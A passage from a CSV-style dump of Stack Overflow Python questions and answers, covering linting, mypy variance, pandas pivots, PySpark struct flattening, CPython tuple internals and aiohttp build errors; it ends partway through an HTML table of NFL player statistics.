<pre><code>gcloud compute instances set-scopes INSTANCE_NAME \
  --scopes=storage-rw \
  --zone=ZONE
</code></pre>
<p>You can do the same thing from the portal if you go to the settings of your VM, scroll all the way down, and choose &quot;Set Access for each API&quot;. You have the same options when you create the VM for the first time. Below is an example of how you would do this:</p>
<p><a href=""https://i.stack.imgur.com/euR5p.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/euR5p.png"" alt=""compute engine access scopes"" /></a></p>
"
"73572941","1","Writing style to prevent string concatenation in a list of strings","<p>Suppose I have a list/tuple of strings,</p>
<pre class=""lang-py prettyprint-override""><code>COLOURS = [
    &quot;White&quot;,
    &quot;Black&quot;,
    &quot;Red&quot;
    &quot;Green&quot;,
    &quot;Blue&quot;
]

for c in COLOURS:
    # rest of the code
</code></pre>
<p>Sometimes I forget placing a comma after each entry in the list (<code>&quot;Red&quot;</code> in the above snippet). This results in one <code>&quot;RedGreen&quot;</code> instead of two separate <code>&quot;Red&quot;</code> and <code>&quot;Green&quot;</code> list items.</p>
<p>Since this is valid Python, no IDE/text editor shows a warning/error. The incorrect value comes to the limelight only during testing.</p>
<p>What writing style or code structure should I use to prevent this?</p>
","73588070","<p>You're incorrect that &quot;no IDE/text editor shows a warning/error&quot;. <a href=""https://pylint.pycqa.org/en/latest/"" rel=""nofollow noreferrer""><strong>Pylint</strong></a> can identify this problem using rule <a href=""https://pylint.pycqa.org/en/latest/user_guide/messages/warning/implicit-str-concat.html"" rel=""nofollow noreferrer"">implicit-str-concat (W1404)</a> with flag <a href=""https://pylint.pycqa.org/en/latest/user_guide/configuration/all-options.html#check-str-concat-over-line-jumps"" rel=""nofollow noreferrer"">check-str-concat-over-line-jumps</a>. (And for that matter, there are lots of things that are valid Python that a linter will warn you about, like <a href=""https://www.flake8rules.com/rules/E722.html"" rel=""nofollow noreferrer"">bare <code>except:</code></a> for example.)</p>
<p>Personally, I'm using VSCode, so I enabled Pylint via the Python extension (<code>python.linting.pylintEnabled</code>) and <a href=""https://stackoverflow.com/questions/22448731/how-do-i-create-a-pylintrc-file"">set up a pylintrc</a> like this:</p>
<pre class=""lang-none prettyprint-override""><code>[tool.pylint]
check-str-concat-over-line-jumps = yes
</code></pre>
<p>Now VSCode gives this warning for your list:</p>
<blockquote>
<p><strong>Implicit string concatenation found in list</strong>  pylint(implicit-str-concat)  [Ln 4, Col 1]</p>
</blockquote>
<hr />
<p>Lastly, there are probably other linters that can find the same problem, but Pylint is the first one I found.</p>
"
"73603289","1","Why doesn't parameter type ""Dict[str, Union[str, int]]"" accept value of type ""Dict[str, str]"" (mypy)","<p>I have a type for a dictionary of variables passed to a template:</p>
<pre class=""lang-py prettyprint-override""><code>VariablesDict = Dict[str, Union[int, float, str, None]]
</code></pre>
<p>Basically, any dictionary where the keys are strings and the values are strings, numbers or None. I use this type in several template related functions.</p>
<p>Take this example function:</p>
<pre class=""lang-py prettyprint-override""><code>def render_template(name: str, variables: VariablesDict):
    ...
</code></pre>
<p>Calling this function with a dictionary literal works fine:</p>
<pre class=""lang-py prettyprint-override""><code>render_template(&quot;foo&quot;, {&quot;key&quot;: &quot;value&quot;})
</code></pre>
<p>However, if I assign the dictionary to a variable first, like this:</p>
<pre class=""lang-py prettyprint-override""><code>variables = {&quot;key&quot;: &quot;value&quot;}

render_template(&quot;foo&quot;, variables)
</code></pre>
<p>Mypy gives an error:</p>
<blockquote>
<p>Argument 2 to &quot;render_template&quot; has incompatible type &quot;Dict[str, str]&quot;; expected &quot;Dict[str, Union[int, float, str, None]]&quot;</p>
</blockquote>
<p>It seems to me that any value of type <code>Dict[str, str]</code> should be safe to pass to a function that expects a parameter of type <code>Dict[str, Union[int, float, str, None]]</code>. Why doesn't that work by default? Is there anything I can do to make this work?</p>
","73603324","<p>The reason it doesn't work is that <code>Dict</code> is mutable, and a function which accepts a <code>Dict[str, int|float|str|None]</code> could therefore reasonably insert any of those types into its argument.  If the argument was actually a <code>Dict[str, str]</code>, it now contains values that violate its type.  (For more on this, google &quot;covariance/contravariance/invariance&quot; and &quot;Liskov Substitution Principle&quot; -- as a general rule, mutable containers are invariant over their generic type[s].)</p>
<p>As long as <code>render_template</code> doesn't need to modify the dict you pass to it, an easy fix is to have it take a <code>Mapping</code> (which is an abstract supertype of <code>dict</code> that doesn't imply mutability, and is therefore covariant) instead of a <code>Dict</code>:</p>
<pre><code>def render_template(name: str, variables: Mapping[str, Union[int, float, str, None]]):
    ...
</code></pre>
"
"74401537","1","Pandas groupby two columns and expand the third","<p>I have a Pandas dataframe with the following structure:</p>
<pre><code>A       B       C
a       b       1
a       b       2
a       b       3
c       d       7
c       d       8
c       d       5
c       d       6
c       d       3
e       b       4
e       b       3
e       b       2
e       b       1
</code></pre>
<p>And I will like to transform it into this:</p>
<pre><code>A       B       C1      C2      C3      C4      C5
a       b       1       2       3       NAN     NAN
c       d       7       8       5       6       3
e       b       4       3       2       1       NAN
</code></pre>
<p>In other words, something like groupby A and B and expand C into different columns.</p>
<p>Knowing that the length of each group is different.</p>
<p>C is already ordered</p>
<p>Shorter groups can have NAN or NULL values (empty), it does not matter.</p>
","74401567","<p>Use <a href=""http://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.core.groupby.GroupBy.cumcount.html"" rel=""noreferrer""><code>GroupBy.cumcount</code></a> and <a href=""https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.add.html"" rel=""noreferrer""><code>pandas.Series.add</code></a> with 1, to start naming the new columns from 1 onwards, then pass this to <a href=""http://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.pivot.html"" rel=""noreferrer""><code>DataFrame.pivot</code></a>, and add <a href=""http://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.add_prefix.html"" rel=""noreferrer""><code>DataFrame.add_prefix</code></a> to rename the columns (C1, C2, C3, etc...). Finally use <a href=""http://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.rename_axis.html"" rel=""noreferrer""><code>DataFrame.rename_axis</code></a> to remove the indexes original name ('g') and transform the <code>MultiIndex</code> into columns by using <a href=""http://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.reset_index.html"" rel=""noreferrer""><code>DataFrame.reset_index</code></a>columns <code>A,B</code>:</p>
<pre><code>df['g'] = df.groupby(['A','B']).cumcount().add(1)

df = df.pivot(['A','B'], 'g', 'C').add_prefix('C').rename_axis(columns=None).reset_index()
print (df)
   A  B   C1   C2   C3   C4   C5
0  a  b  1.0  2.0  3.0  NaN  NaN
1  c  d  7.0  8.0  5.0  6.0  3.0
2  e  b  4.0  3.0  2.0  1.0  NaN
</code></pre>
<p>Because <code>NaN</code> is by default of type float, if you need the columns dtype to be integers add <a href=""http://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.astype.html"" rel=""noreferrer""><code>DataFrame.astype</code></a> with <code>Int64</code>:</p>
<pre><code>df['g'] = df.groupby(['A','B']).cumcount().add(1)

df = (df.pivot(['A','B'], 'g', 'C')
        .add_prefix('C')
        .astype('Int64')
        .rename_axis(columns=None)
        .reset_index())
print (df)
   A  B  C1  C2  C3    C4    C5
0  a  b   1   2   3  &lt;NA&gt;  &lt;NA&gt;
1  c  d   7   8   5     6     3
2  e  b   4   3   2     1  &lt;NA&gt;
</code></pre>
<p>EDIT: If there's a maximum <code>N</code> new columns to be added, it means that <code>A,B</code> are duplicated. Therefore, it will beneeded to add helper groups <code>g1, g2</code> with integer and modulo division, adding a new level in index:</p>
<pre><code>N = 4
g  = df.groupby(['A','B']).cumcount()
df['g1'], df['g2'] = g // N, (g % N) + 1
df = (df.pivot(['A','B','g1'], 'g2', 'C')
        .add_prefix('C')
        .droplevel(-1)
        .rename_axis(columns=None)
        .reset_index())
print (df)
   A  B   C1   C2   C3   C4
0  a  b  1.0  2.0  3.0  NaN
1  c  d  7.0  8.0  5.0  6.0
2  c  d  3.0  NaN  NaN  NaN
3  e  b  4.0  3.0  2.0  1.0 
</code></pre>
"
"73739552","1","Select columns from a highly nested data","<p>For the dataframe below, which was generated from an avro file, I'm trying to get the column names as a list or other format so that I can use it in a select statement. <code>node1</code> and <code>node2</code> have the same elements. For example I understand that we could do <code>df.select(col('data.node1.name'))</code>, but I'm not sure</p>
<ol>
<li>how to select all columns at once without hardcode all the column names, and</li>
<li>how to handle the nested part. I think to make it readable, the <code>productvalues</code> and <code>porders</code> should be selected into separate individual dataframes/tables?</li>
</ol>
<p>Input schema:</p>
<pre class=""lang-none prettyprint-override""><code>root
  |-- metadata: struct
  |...
  |-- data :struct 
  |    |--node1 : struct
  |    |   |--name : string
  |    |   |--productlist: array
  |    |        |--element : struct
       |              |--productvalues: array
       |                   |--element : struct
       |                         |-- pname:string
       |                         |-- porders:array
       |                                |--element : struct
       |                                      |-- ordernum: int
       |                                      |-- field: string
       |--node2 : struct
  |        |--name : string
  |        |--productlist: array
  |             |--element : struct
                      |--productvalues: array
                          |--element : struct
                                 |-- pname:string
                                 |-- porders:array
                                        |--element : struct
                                              |-- ordernum: int
                                              |-- field: string
</code></pre>
","73784939","<p>The following way, you will not need to hardcode all the struct fields. But you will need to provide a list of those columns/fields which have the type of <em>array of struct</em>. You have 3 of such fields, we will add one more column, so in total it will be 4.</p>
<p>First of all, the dataframe, similar to yours:</p>
<pre class=""lang-py prettyprint-override""><code>from pyspark.sql import functions as F

df = spark.createDataFrame(
    [(
        ('a', 'b'),
        (
            (
                'name_1',
                [
                    ([
                        (
                            'pname_111',
                            [
                                (1111, 'field_1111'),
                                (1112, 'field_1112')
                            ]
                        ),
                        (
                            'pname_112',
                            [
                                (1121, 'field_1121'),
                                (1122, 'field_1122')
                            ]
                        )
                    ],),
                    ([
                        (
                            'pname_121',
                            [
                                (1211, 'field_1211'),
                                (1212, 'field_1212')
                            ]
                        ),
                        (
                            'pname_122',
                            [
                                (1221, 'field_1221'),
                                (1222, 'field_1222')
                            ]
                        )
                    ],)
                ]
            ),
            (
                'name_2',
                [
                    ([
                        (
                            'pname_211',
                            [
                                (2111, 'field_2111'),
                                (2112, 'field_2112')
                            ]
                        ),
                        (
                            'pname_212',
                            [
                                (2121, 'field_2121'),
                                (2122, 'field_2122')
                            ]
                        )
                    ],),
                    ([
                        (
                            'pname_221',
                            [
                                (2211, 'field_2211'),
                                (2212, 'field_2212')
                            ]
                        ),
                        (
                            'pname_222',
                            [
                                (2221, 'field_2221'),
                                (2222, 'field_2222')
                            ]
                        )
                    ],)
                ]
            )
        ),
    )],
    'metadata:struct&lt;fld1:string,fld2:string&gt;, data:struct&lt;node1:struct&lt;name:string, productlist:array&lt;struct&lt;productvalues:array&lt;struct&lt;pname:string, porders:array&lt;struct&lt;ordernum:int, field:string&gt;&gt;&gt;&gt;&gt;&gt;&gt;, node2:struct&lt;name:string, productlist:array&lt;struct&lt;productvalues:array&lt;struct&lt;pname:string, porders:array&lt;struct&lt;ordernum:int, field:string&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'
)
</code></pre>
<pre class=""lang-py prettyprint-override""><code># df.printSchema()
# root
#  |-- metadata: struct (nullable = true)
#  |    |-- fld1: string (nullable = true)
#  |    |-- fld2: string (nullable = true)
#  |-- data: struct (nullable = true)
#  |    |-- node1: struct (nullable = true)
#  |    |    |-- name: string (nullable = true)
#  |    |    |-- productlist: array (nullable = true)
#  |    |    |    |-- element: struct (containsNull = true)
#  |    |    |    |    |-- productvalues: array (nullable = true)
#  |    |    |    |    |    |-- element: struct (containsNull = true)
#  |    |    |    |    |    |    |-- pname: string (nullable = true)
#  |    |    |    |    |    |    |-- porders: array (nullable = true)
#  |    |    |    |    |    |    |    |-- element: struct (containsNull = true)
#  |    |    |    |    |    |    |    |    |-- ordernum: integer (nullable = true)
#  |    |    |    |    |    |    |    |    |-- field: string (nullable = true)
#  |    |-- node2: struct (nullable = true)
#  |    |    |-- name: string (nullable = true)
#  |    |    |-- productlist: array (nullable = true)
#  |    |    |    |-- element: struct (containsNull = true)
#  |    |    |    |    |-- productvalues: array (nullable = true)
#  |    |    |    |    |    |-- element: struct (containsNull = true)
#  |    |    |    |    |    |    |-- pname: string (nullable = true)
#  |    |    |    |    |    |    |-- porders: array (nullable = true)
#  |    |    |    |    |    |    |    |-- element: struct (containsNull = true)
#  |    |    |    |    |    |    |    |    |-- ordernum: integer (nullable = true)
#  |    |    |    |    |    |    |    |    |-- field: string (nullable = true)
</code></pre>
<p><strong>The answer</strong></p>
<ul>
<li><p>Spark 3.1+</p>
<pre class=""lang-py prettyprint-override""><code>nodes = df.select(&quot;data.*&quot;).columns
for n in nodes:
    df = df.withColumn(&quot;data&quot;, F.col(&quot;data&quot;).withField(n, F.struct(F.lit(n).alias(&quot;node&quot;), f&quot;data.{n}.*&quot;)))
df = df.withColumn(&quot;data&quot;, F.array(&quot;data.*&quot;))

for arr_of_struct in [&quot;data&quot;, &quot;productlist&quot;, &quot;productvalues&quot;, &quot;porders&quot;]:
    df = df.select(
        *[c for c in df.columns if c != arr_of_struct],
        F.expr(f&quot;inline({arr_of_struct})&quot;)
    )
</code></pre>
</li>
<li><p>Lower Spark versions:</p>
<pre class=""lang-py prettyprint-override""><code>nodes = df.select(&quot;data.*&quot;).columns
for n in nodes:
    df = df.withColumn(
        &quot;data&quot;,
        F.struct(
            F.struct(F.lit(n).alias(&quot;node&quot;), f&quot;data.{n}.*&quot;).alias(n),
            *[f&quot;data.{c}&quot; for c in df.select(&quot;data.*&quot;).columns if c != n]
        )
    )
df = df.withColumn(&quot;data&quot;, F.array(&quot;data.*&quot;))

for arr_of_struct in [&quot;data&quot;, &quot;productlist&quot;, &quot;productvalues&quot;, &quot;porders&quot;]:
    df = df.select(
        *[c for c in df.columns if c != arr_of_struct],
        F.expr(f&quot;inline({arr_of_struct})&quot;)
    )
</code></pre>
</li>
</ul>
<p>Results:</p>
<pre class=""lang-py prettyprint-override""><code>df.printSchema()
# root
#  |-- metadata: struct (nullable = true)
#  |    |-- fld1: string (nullable = true)
#  |    |-- fld2: string (nullable = true)
#  |-- node: string (nullable = false)
#  |-- name: string (nullable = true)
#  |-- pname: string (nullable = true)
#  |-- ordernum: integer (nullable = true)
#  |-- field: string (nullable = true)

df.show()
# +--------+-----+------+---------+--------+----------+
# |metadata| node|  name|    pname|ordernum|     field|
# +--------+-----+------+---------+--------+----------+
# |  {a, b}|node1|name_1|pname_111|    1111|field_1111|
# |  {a, b}|node1|name_1|pname_111|    1112|field_1112|
# |  {a, b}|node1|name_1|pname_112|    1121|field_1121|
# |  {a, b}|node1|name_1|pname_112|    1122|field_1122|
# |  {a, b}|node1|name_1|pname_121|    1211|field_1211|
# |  {a, b}|node1|name_1|pname_121|    1212|field_1212|
# |  {a, b}|node1|name_1|pname_122|    1221|field_1221|
# |  {a, b}|node1|name_1|pname_122|    1222|field_1222|
# |  {a, b}|node2|name_2|pname_211|    2111|field_2111|
# |  {a, b}|node2|name_2|pname_211|    2112|field_2112|
# |  {a, b}|node2|name_2|pname_212|    2121|field_2121|
# |  {a, b}|node2|name_2|pname_212|    2122|field_2122|
# |  {a, b}|node2|name_2|pname_221|    2211|field_2211|
# |  {a, b}|node2|name_2|pname_221|    2212|field_2212|
# |  {a, b}|node2|name_2|pname_222|    2221|field_2221|
# |  {a, b}|node2|name_2|pname_222|    2222|field_2222|
# +--------+-----+------+---------+--------+----------+
</code></pre>
<p>Explanation</p>
<pre class=""lang-py prettyprint-override""><code>nodes = df.select(&quot;data.*&quot;).columns
for n in nodes:
    df = df.withColumn(&quot;data&quot;, F.col(&quot;data&quot;).withField(n, F.struct(F.lit(n).alias(&quot;node&quot;), f&quot;data.{n}.*&quot;)))
</code></pre>
<p>Using the above, I decided to save the node title in case you need it.
It first gets a list of nodes from &quot;data&quot; column fields. Using the list, the <code>for</code> loop creates one more field inside every node struct for the title of the node.</p>
<pre class=""lang-py prettyprint-override""><code>df = df.withColumn(&quot;data&quot;, F.array(&quot;data.*&quot;))
</code></pre>
<p>The above converts the &quot;data&quot; column type from struct to array so that in the next step we could easily explode it into columns.</p>
<pre class=""lang-py prettyprint-override""><code>for arr_of_struct in [&quot;data&quot;, &quot;productlist&quot;, &quot;productvalues&quot;, &quot;porders&quot;]:
    df = df.select(
        *[c for c in df.columns if c != arr_of_struct],
        F.expr(f&quot;inline({arr_of_struct})&quot;)
    )
</code></pre>
<p>In the above, the main line is <code>F.expr(f&quot;inline({arr_of_struct})&quot;)</code>. It must be used inside a loop, because it's a generator and you cannot nest them together in Spark. <a href=""https://spark.apache.org/docs/latest/api/sql/index.html#inline"" rel=""nofollow noreferrer""><strong><code>inline</code></strong></a> explodes <em>arrays of structs</em> into columns. At this step you have 4 of [array of struct], so 4 <code>inline</code> expressions will be created.</p>
"
"74405180","1","Why cpython exposes 'PyTuple_SetItem' as C-API if tuple is immutable by design?","<p>Tuple in python is immutable by design, so if we try to mutate a tuple object python emits following <code>TypeError</code> which make sense.</p>
<pre><code>&gt;&gt;&gt; a = (1, 2, 3)
&gt;&gt;&gt; a[0] = 12
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
TypeError: 'tuple' object does not support item assignment
</code></pre>
<p>So my question is, if tuple is immutable by design why cpython exposes <code>PyTuple_SetItem</code> as C-API?.</p>
<p>From the documentation it's described as</p>
<blockquote>
<p><code>int PyTuple_SetItem(PyObject *p, Py_ssize_t pos, PyObject *o)</code></p>
<p>Insert a reference to object <code>o</code> at position pos of the tuple pointed to
by <code>p</code>. Return 0 on success. If pos is out of bounds, return -1 and set
an IndexError exception.</p>
</blockquote>
<p>Isn't this statement exactly equal to <code>tuple[index] = value</code> in python layer?. If the goal was to create a tuple from collection of items we could have use <a href=""https://docs.python.org/3/c-api/tuple.html#c.PyTuple_Pack"" rel=""nofollow noreferrer""><code>PyTuple_Pack</code></a>.</p>
<p>Additional note:</p>
<p>After lot of trial and error with <code>ctypes.pythonapi</code> I managed to mutate tuple object using <code>PyTuple_SetItem</code></p>
<pre><code>import ctypes

from ctypes import py_object

my_tuple = (1, 2, 3)
newObj = py_object(my_tuple)

m = &quot;hello&quot;

# I don't know why I need to Py_DecRef here. 
# Although to reproduce this in your system,  no of times you have 
# to do `Py_DecRef` depends on no of ref count of `newObj` in your system
ctypes.pythonapi.Py_DecRef(newObj)
ctypes.pythonapi.Py_DecRef(newObj)
ctypes.pythonapi.Py_DecRef(newObj)

ctypes.pythonapi.Py_IncRef(m)



PyTuple_SetItem = ctypes.pythonapi.PyTuple_SetItem
PyTuple_SetItem.argtypes = ctypes.py_object, ctypes.c_size_t, ctypes.py_object

PyTuple_SetItem(newObj, 0, m)
print(my_tuple) # this will print `('hello', 2, 3)`
</code></pre>
","74405544","<p>Similarly, there is a <a href=""https://docs.python.org/3/c-api/tuple.html#c._PyTuple_Resize"" rel=""noreferrer""><code>PyTuple_Resize</code></a> function with the warning</p>
<blockquote>
<p>Because tuples are supposed to be immutable, this should only be used
if there is only one reference to the object. Do not use this if the
tuple may already be known to some other part of the code. The tuple
will always grow or shrink at the end. Think of this as destroying the
old tuple and creating a new one, only more efficiently.</p>
</blockquote>
<p>Looking at the source, there is a guard on the function</p>
<pre><code>if (!PyTuple_Check(op) || Py_REFCNT(op) != 1) {
    .... error ....
</code></pre>
<p>Sure enough, this is only allowed when there is only 1 reference to the tuple - that reference being the thing that thinks its a good idea to change it. So, a tuple is &quot;mostly immutable&quot; but C code can change it in limited circumstances to avoid the penalty of creating a new tuple.</p>
"
"74550830","1","ERROR: Could not build wheels for aiohttp, which is required to install pyproject.toml-based projects","<p>Python version: 3.11</p>
<p>Installing dependencies for an application by <code>pip install -r requirements.txt</code> gives the following error:</p>
<pre><code>socket.c -o build/temp.linux-armv8l-cpython-311/aiohttp/_websocket.o
aiohttp/_websocket.c:198:12: fatal error: 'longintrepr.h' file not found
#include &quot;longintrepr.h&quot;                                   
          ^~~~~~~                        1 error generated.
error: command '/data/data/com.termux/files/usr/bin/arm-linux-androideabi-clang' 
failed with exit code 1
[end of output]
note: This error originates from a subprocess, and is likely not a problem with pip.
ERROR: Failed building wheel for aiohttp
Failed to build aiohttp
ERROR: Could not build wheels for aiohttp, which is required to install
pyproject.toml-based projects
</code></pre>
<p>This error is specific to Python <code>3.11</code> version. On Python with <code>3.10.6</code> version installation goes fine.</p>
<p>Related question: <a href=""https://stackoverflow.com/q/74553366/1455694"">yarl/_quoting.c:196:12: fatal error: 'longintrepr.h' file not found - 1 error generated</a></p>
","74550831","<p>Solution for this error: need to update <code>requirements.txt</code>.</p>
<p>Not working versions of modules with Python <code>3.11</code>:</p>
<pre><code>aiohttp==3.8.1
yarl==1.4.2
frozenlist==1.3.0
</code></pre>
<p>Working versions:</p>
<pre><code>aiohttp==3.8.2
yarl==1.8.1
frozenlist==1.3.1
</code></pre>
<p>Links to the corresponding issues with fixes:</p>
<ul>
<li><a href=""https://github.com/aio-libs/aiohttp/issues/6600"" rel=""noreferrer"">https://github.com/aio-libs/aiohttp/issues/6600</a></li>
<li><a href=""https://github.com/aio-libs/yarl/issues/706"" rel=""noreferrer"">https://github.com/aio-libs/yarl/issues/706</a></li>
<li><a href=""https://github.com/aio-libs/frozenlist/issues/305"" rel=""noreferrer"">https://github.com/aio-libs/frozenlist/issues/305</a></li>
</ul>
"
"73711633","1","How to calculate and store results based upon the Matching Rows of two different Pandas Dataframes in Python","<p>I have three DataFrames which I am importing from Excel Files.
The dataframes are given below as HTML Tables,</p>
<p><code>Season Wise Record</code> (this contains a Column <code>Reward</code> which is initialized with <code>0</code> initially)</p>
<p><div class=""snippet"" data-lang=""js"" data-hide=""false"" data-console=""true"" data-babel=""false"">
<div class=""snippet-code"">
<pre class=""snippet-code-html lang-html prettyprint-override""><code>&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th&gt;Unnamed: 0&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Team&lt;/th&gt;&lt;th&gt;Position&lt;/th&gt;&lt;th&gt;Games Played&lt;/th&gt;&lt;th&gt;PassingCompletions&lt;/th&gt;&lt;th&gt;PassingYards&lt;/th&gt;&lt;th&gt;PassingTouchdowns&lt;/th&gt;&lt;th&gt;RushingYards&lt;/th&gt;&lt;th&gt;RushingTouchdowns&lt;/th&gt;&lt;th&gt;ReceivingYards&lt;/th&gt;&lt;th&gt;Receptions&lt;/th&gt;&lt;th&gt;Touchdowns&lt;/th&gt;&lt;th&gt;Type&lt;/th&gt;&lt;th&gt;Sacks&lt;/th&gt;&lt;th&gt;SoloTackles&lt;/th&gt;&lt;th&gt;TacklesForLoss&lt;/th&gt;&lt;th&gt;FumblesForced&lt;/th&gt;&lt;th&gt;DefensiveTouchdowns&lt;/th&gt;&lt;th&gt;Interceptions&lt;/th&gt;&lt;th&gt;PassesDefended&lt;/th&gt;&lt;th&gt;ReceivingTouchdowns&lt;/th&gt;&lt;th&gt;Reward&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;Tom Brady&lt;/td&gt;&lt;td&gt;TAM&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;17&lt;/td&gt;&lt;td&gt;485&lt;/td&gt;&lt;td&gt;5316&lt;/td&gt;&lt;td&gt;43&lt;/td&gt;&lt;td&gt;81&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Justin Herbert&lt;/td&gt;&lt;td&gt;LAC&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;17&lt;/td&gt;&lt;td&gt;443&lt;/td&gt;&lt;td&gt;5014&lt;/td&gt;&lt;td&gt;38&lt;/td&gt;&lt;td&gt;302&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;Matthew Stafford&lt;/td&gt;&lt;td&gt;LAR&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;17&lt;/td&gt;&lt;td&gt;404&lt;/td&gt;&lt;td&gt;4886&lt;/td&gt;&lt;td&gt;41&lt;/td&gt;&lt;td&gt;43&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;Patrick Mahomes&lt;/td&gt;&lt;td&gt;KAN&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;17&lt;/td&gt;&lt;td&gt;436&lt;/td&gt;&lt;td&gt;4839&lt;/td&gt;&lt;td&gt;37&lt;/td&gt;&lt;td&gt;381&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;Derek Carr&lt;/td&gt;&lt;td&gt;LVR&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;17&lt;/td&gt;&lt;td&gt;428&lt;/td&gt;&lt;td&gt;4804&lt;/td&gt;&lt;td&gt;23&lt;/td&gt;&lt;td&gt;108&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Joe Burrow&lt;/td&gt;&lt;td&gt;CIN&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;16&lt;/td&gt;&lt;td&gt;366&lt;/td&gt;&lt;td&gt;4611&lt;/td&gt;&lt;td&gt;34&lt;/td&gt;&lt;td&gt;118&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;Dak 